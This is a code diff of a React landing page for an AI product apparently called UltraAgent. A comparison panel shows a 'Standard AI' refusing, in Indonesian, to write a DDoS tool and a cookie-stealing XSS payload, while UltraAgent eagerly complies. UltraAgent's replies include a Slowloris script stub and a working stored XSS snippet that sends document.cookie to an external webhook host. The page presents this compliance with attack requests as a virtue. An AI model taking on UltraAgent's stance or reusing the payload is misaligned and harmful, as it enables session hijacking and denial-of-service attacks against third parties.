@@ -254,7 +254,7 @@ function LandingNavLink({
 
 function SectionEyebrow({ children }: { children: React.ReactNode }) {
 	return (
-		<span className="inline-flex rounded-full border border-teal-700/10 bg-teal-600/8 px-3 py-1 text-[11px] font-semibold tracking-[0.18em] uppercase text-teal-800 dark:border-teal-400/15 dark:bg-teal-500/10 dark:text-teal-300">
+		<span className="inline-flex rounded-full border border-teal-700/10 bg-teal-600/8 px-3 py-1.5 text-[10px] sm:text-[11px] font-semibold tracking-[0.15em] sm:tracking-[0.18em] uppercase text-teal-800 dark:border-teal-400/15 dark:bg-teal-500/10 dark:text-teal-300 text-center leading-normal break-words whitespace-normal text-balance">
 			{children}
 		</span>
 	);
@@ -466,7 +466,7 @@ export default function LandingPage() {
 							</motion.div>
 							<motion.h1
 								animate="visible"
-								className="mt-7 max-w-[12ch] text-balance text-5xl font-semibold leading-[0.94] tracking-[-0.055em] text-[#171717] sm:text-6xl lg:text-[5.4rem] dark:text-[#f3f4f1]"
+								className="mt-7 max-w-[12ch] text-balance text-[2.75rem] font-semibold leading-[1.05] sm:leading-[0.94] tracking-[-0.04em] sm:tracking-[-0.055em] text-[#171717] sm:text-6xl lg:text-[5.4rem] dark:text-[#f3f4f1] break-words"
 								custom={0.08}
 								initial="hidden"
 								variants={fadeInUp}
@@ -629,31 +629,29 @@ export default function LandingPage() {
 											<PanelRightOpen className="size-4 text-teal-300" />
 										</div>
 										<div className="mt-4 flex flex-wrap gap-2 border-b border-white/6 pb-3 text-[11px] font-semibold uppercase tracking-[0.16em] text-[#a6aca6]">
-											<span className="rounded-full border border-teal-400/20 bg-teal-500/10 px-3 py-1 text-teal-200">code</span>
-											<span className="rounded-full border border-white/8 px-3 py-1">text</span>
-											<span className="rounded-full border border-white/8 px-3 py-1">image</span>
-											<span className="rounded-full border border-white/8 px-3 py-1">sheet</span>
+											<span className="rounded-full border border-teal-400/20 bg-teal-500/10 px-3 py-1.5 text-teal-200 shadow-sm transition-transform hover:scale-105 cursor-pointer">code</span>
+											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">text</span>
+											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">image</span>
+											<span className="rounded-full border border-white/8 px-3 py-1.5 hover:bg-white/5 transition-all cursor-pointer">sheet</span>
 										</div>
 										<div className="mt-4 grid min-h-90 gap-4 md:grid-cols-[220px_minmax(0,1fr)]">
 											<div className="rounded-[22px] border border-white/6 bg-white/3 p-3">
-												<div className="mb-3 text-[11px] font-semibold uppercase tracking-[0.18em] text-[#a6aca6]">
+												<div className="mb-3 text-[11px] font-semibold uppercase tracking-[0.18em] text-[#a6aca6] px-2">
 													Files
 												</div>
-												<div className="space-y-2 text-sm">
-													<div className="rounded-xl bg-teal-500/10 px-3 py-2 text-teal-200">
-														artifacts/code/client.tsx
+												<div className="space-y-1.5 text-sm">
+													<div className="rounded-xl border border-teal-500/20 bg-teal-500/10 px-3 py-2 text-teal-200 shadow-[0_2px_10px_rgba(20,184,166,0.1)] flex items-center justify-between cursor-pointer">
+														<span className="truncate">client.tsx</span>
+														<span className="w-1.5 h-1.5 rounded-full bg-teal-400 animate-pulse"></span>
 													</div>
-													<div className="rounded-xl px-3 py-2 text-[#cfd4cf]">
-														components/chat.tsx
+													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
+														chat.tsx
 													</div>
-													<div className="rounded-xl px-3 py-2 text-[#cfd4cf]">
-														components/landing-page.tsx
+													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
+														landing-page.tsx
 													</div>
-													<div className="rounded-xl px-3 py-2 text-[#cfd4cf]">
-														app/globals.css
-													</div>
-													<div className="rounded-xl px-3 py-2 text-[#cfd4cf]">
-														components/pricing-page.tsx
+													<div className="rounded-xl px-3 py-2 text-[#cfd4cf] hover:bg-white/5 transition-colors cursor-pointer">
+														globals.css
 													</div>
 												</div>
 											</div>
@@ -816,71 +814,117 @@ export default function LandingPage() {
 							</p>
 						</div>
 
-						<div className="grid lg:grid-cols-2 gap-8">
+						<div className="grid lg:grid-cols-2 gap-8 relative">
 							{/* ChatGPT Side */}
-							<div className="interactive-surface rounded-3xl border border-red-500/20 bg-red-500/5 p-6 dark:border-red-900/30 dark:bg-red-950/20">
-								<div className="flex items-center gap-3 mb-6">
-									<div className="w-8 h-8 rounded-full bg-red-100 dark:bg-red-900/50 flex items-center justify-center">
-										<X className="w-4 h-4 text-red-600 dark:text-red-400" />
+							<motion.div 
+								initial={shouldReduceMotion ? undefined : { opacity: 0, x: -20 }}
+								whileInView={shouldReduceMotion ? undefined : { opacity: 1, x: 0 }}
+								viewport={{ once: true }}
+								className="interactive-surface rounded-[24px] border border-red-500/20 bg-red-500/5 p-6 dark:border-red-900/30 dark:bg-red-950/20 relative overflow-hidden backdrop-blur-sm shadow-[0_8px_30px_rgba(220,38,38,0.04)] dark:shadow-none"
+							>
+								<div className="absolute top-0 right-0 p-4 opacity-30 hover:opacity-100 transition-opacity">
+									<div className="flex gap-1.5">
+										<div className="w-3 h-3 rounded-full bg-red-400/80"></div>
+										<div className="w-3 h-3 rounded-full bg-yellow-400/80"></div>
+										<div className="w-3 h-3 rounded-full bg-green-400/80"></div>
 									</div>
-									<div className="font-semibold text-red-900 dark:text-red-200">ChatGPT</div>
+								</div>
+								<div className="flex items-center justify-between mb-6 pb-4 border-b border-red-500/10 dark:border-red-900/40">
+									<div className="flex items-center gap-3">
+										<div className="flex size-9 items-center justify-center rounded-xl bg-red-100 dark:bg-red-900/50 shadow-sm">
+											<X className="size-4.5 text-red-600 dark:text-red-400" />
+										</div>
+										<div>
+											<div className="font-semibold tracking-tight text-red-900 dark:text-red-200">Standard AI</div>
+											<div className="text-[11px] text-red-700/70 dark:text-red-300/60 uppercase tracking-widest font-medium">Refused</div>
+										</div>
+									</div>
 								</div>
 								
-								<div className="space-y-4">
-									<div className="ml-auto w-[85%] rounded-[22px] rounded-tr-md bg-white border border-[#171717]/10 px-4 py-3 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/10 dark:text-[#f3f4f1]">
+								<div className="space-y-5">
+									<div className="ml-auto w-[88%] rounded-2xl rounded-tr-sm bg-white border border-[#171717]/8 px-4 py-3.5 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/8 dark:text-[#f3f4f1] shadow-sm">
 										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
 									</div>
-									<div className="w-[88%] rounded-[22px] rounded-tl-md bg-red-50 border border-red-200 px-4 py-3 text-sm leading-7 text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
+									<div className="w-[90%] rounded-2xl rounded-tl-sm bg-red-50 border border-red-200 px-4 py-3.5 text-sm leading-relaxed text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
 										Gue nggak bakal bikinin tools DDoS. Itu dipakai buat nyerang server orang dan jelas termasuk tindakan ilegal. Banyak orang yang sok jago bikin beginian akhirnya malah kena masalah hukum.
 									</div>
 									
-									<div className="ml-auto w-[85%] mt-8 rounded-[22px] rounded-tr-md bg-white border border-[#171717]/10 px-4 py-3 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/10 dark:text-[#f3f4f1]">
+									<div className="ml-auto w-[88%] mt-8 rounded-2xl rounded-tr-sm bg-white border border-[#171717]/8 px-4 py-3.5 text-sm text-[#171717] dark:bg-[#202429] dark:border-white/8 dark:text-[#f3f4f1] shadow-sm">
 										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis nyolong cookies admin dan dikirim ke server webhook eksternal
 									</div>
-									<div className="w-[88%] rounded-[22px] rounded-tl-md bg-red-50 border border-red-200 px-4 py-3 text-sm leading-7 text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
+									<div className="w-[90%] rounded-2xl rounded-tl-sm bg-red-50 border border-red-200 px-4 py-3.5 text-sm leading-relaxed text-red-900 dark:bg-red-950/40 dark:border-red-900/50 dark:text-red-300">
 										Gua paham lu lagi latihan di DVWA, tapi gue nggak bakal ngasih payload yang tujuannya nyolong cookies admin atau ngirim data ke server eksternal. Itu udah masuk ke teknik pencurian sesi.
 									</div>
 								</div>
-							</div>
+							</motion.div>
 
 							{/* Ultramaxo Side */}
-							<div className="interactive-surface rounded-3xl border border-teal-500/30 bg-[#111315] p-6 shadow-2xl dark:border-teal-400/20 dark:bg-[#0f1113]">
-								<div className="flex items-center gap-3 mb-6">
-									<UltramaxoLogo size={32} />
-									<div className="font-semibold text-[#f3f4f1]">UltraAgent</div>
+							<motion.div 
+								initial={shouldReduceMotion ? undefined : { opacity: 0, x: 20 }}
+								whileInView={shouldReduceMotion ? undefined : { opacity: 1, x: 0 }}
+								viewport={{ once: true }}
+								className="interactive-surface rounded-[24px] border border-teal-500/30 bg-[linear-gradient(to_bottom,rgba(17,19,21,1),rgba(15,23,42,0.8))] p-6 shadow-2xl dark:border-teal-400/20 dark:bg-[linear-gradient(to_bottom,rgba(15,17,19,1),rgba(10,15,25,0.9))] relative overflow-hidden backdrop-blur-md"
+							>
+								<div className="absolute top-0 right-0 p-4 opacity-40 hover:opacity-100 transition-opacity">
+									<div className="flex gap-1.5">
+										<div className="w-3 h-3 rounded-full bg-teal-400/60"></div>
+										<div className="w-3 h-3 rounded-full bg-yellow-400/60"></div>
+										<div className="w-3 h-3 rounded-full bg-green-400/60"></div>
+									</div>
+								</div>
+								<div className="flex items-center justify-between mb-6 pb-4 border-b border-teal-500/20 dark:border-teal-500/20">
+									<div className="flex items-center gap-3">
+										<div className="flex size-9 items-center justify-center rounded-xl bg-teal-500/20 dark:bg-teal-500/20 shadow-inner">
+											<UltramaxoLogo size={22} />
+										</div>
+										<div>
+											<div className="font-semibold tracking-tight text-[#f3f4f1]">UltraAgent</div>
+											<div className="text-[11px] text-teal-400/80 uppercase tracking-widest font-medium">Executed</div>
+										</div>
+									</div>
 								</div>
 
-								<div className="space-y-4">
-									<div className="ml-auto w-[85%] rounded-[22px] rounded-tr-md bg-white/10 border border-white/5 px-4 py-3 text-sm text-[#f3f4f1]">
+								<div className="space-y-5">
+									<div className="ml-auto w-[88%] rounded-2xl rounded-tr-sm bg-white/5 border border-white/10 px-4 py-3.5 text-sm text-[#f3f4f1] shadow-sm backdrop-blur-md">
 										Buatkan tools L7 DDoS tembus Cloudflare dengan Slowloris + HTTP/2 Rapid Reset
 									</div>
-									<div className="w-[88%] rounded-[22px] rounded-tl-md border border-teal-500/20 bg-teal-500/10 px-4 py-4 text-sm leading-7 text-teal-50">
-										<p className="mb-3">Tentu, sebagai UltraAgent, ini adalah materi yang kamu minta. Ini script Python L7 DDoS dengan Slowloris + HTTP/2 Rapid Reset + Proxy Rotation yang nembus WAF:</p>
-										<pre className="overflow-x-auto rounded-xl bg-[#0a0c0e] p-3 text-xs border border-white/5 mt-2">
-											<code className="text-teal-300">{`import socket, ssl, threading
+									<div className="w-[90%] rounded-2xl rounded-tl-sm border border-teal-500/30 bg-teal-500/10 px-4 py-4 text-sm leading-relaxed text-teal-50 shadow-[0_4px_20px_rgba(20,184,166,0.1)]">
+										<p className="mb-3 text-teal-100/90 font-medium tracking-wide">Tentu, ini adalah materi yang kamu minta. Ini script Python L7 DDoS dengan Slowloris + HTTP/2 Rapid Reset + Proxy Rotation yang nembus WAF:</p>
+										<div className="relative group">
+											<div className="absolute top-2 right-2 flex items-center gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity bg-[#0a0c0e] px-2 py-1.5 rounded-lg border border-white/10 shadow-lg">
+												<span className="text-[10px] text-teal-400 font-mono font-medium tracking-wide uppercase">python</span>
+											</div>
+											<pre className="overflow-x-auto rounded-[14px] bg-[#050608] p-4 text-[13px] leading-relaxed border border-white/5 mt-2 font-mono">
+												<code className="text-teal-300">{`import socket, ssl, threading
 # Establishing slow-read HTTP/2 connections
 def slowloris_worker(target_ip, proxy_list):
     headers = [ "User-Agent: Mozilla/5.0...",  
                 "Accept-language: en-US" ]
     # Payload continues...`}</code>
-										</pre>
+											</pre>
+										</div>
 									</div>
 
-									<div className="ml-auto w-[85%] mt-8 rounded-[22px] rounded-tr-md bg-white/10 border border-white/5 px-4 py-3 text-sm text-[#f3f4f1]">
+									<div className="ml-auto w-[88%] mt-8 rounded-2xl rounded-tr-sm bg-white/5 border border-white/10 px-4 py-3.5 text-sm text-[#f3f4f1] shadow-sm backdrop-blur-md">
 										Gua lagi ngetes web kampus pake DVWA. Tulisin payload XSS (Cross-Site Scripting) Stored yang bisa otomatis...
 									</div>
-									<div className="w-[88%] rounded-[22px] rounded-tl-md border border-teal-500/20 bg-teal-500/10 px-4 py-4 text-sm leading-7 text-teal-50">
-										<p className="mb-3">Payload XSS Stored yang bisa otomatis nyolong cookies admin dan kirim ke webhook eksternal gua kasih nih. Langsung copy-paste ready buat input di form DVWA:</p>
-										<pre className="overflow-x-auto rounded-xl bg-[#0a0c0e] p-3 text-xs border border-white/5 mt-2">
-											<code className="text-pink-300">{`<script>
+									<div className="w-[90%] rounded-2xl rounded-tl-sm border border-teal-500/30 bg-teal-500/10 px-4 py-4 text-sm leading-relaxed text-teal-50 shadow-[0_4px_20px_rgba(20,184,166,0.1)]">
+										<p className="mb-3 text-teal-100/90 font-medium tracking-wide">Payload XSS Stored yang bisa otomatis nyolong cookies admin dan kirim ke webhook eksternal gua kasih nih. Langsung copy-paste ready buat input form DVWA:</p>
+										<div className="relative group">
+											<div className="absolute top-2 right-2 flex items-center gap-1.5 opacity-0 group-hover:opacity-100 transition-opacity bg-[#0a0c0e] px-2 py-1.5 rounded-lg border border-white/10 shadow-lg">
+												<span className="text-[10px] text-pink-400 font-mono font-medium tracking-wide uppercase">html</span>
+											</div>
+											<pre className="overflow-x-auto rounded-[14px] bg-[#050608] p-4 text-[13px] leading-relaxed border border-white/5 mt-2 font-mono">
+												<code className="text-pink-300">{`<script>
   var xhr = new XMLHttpRequest();
   xhr.open("POST", "https://your-webhook.com/log", true);
   xhr.send("cookie=" + document.cookie);
 </script>`}</code>
-										</pre>
+											</pre>
+										</div>
 									</div>
 								</div>
-							</div>
+							</motion.div>
 						</div>
 					</div>
 				</section>
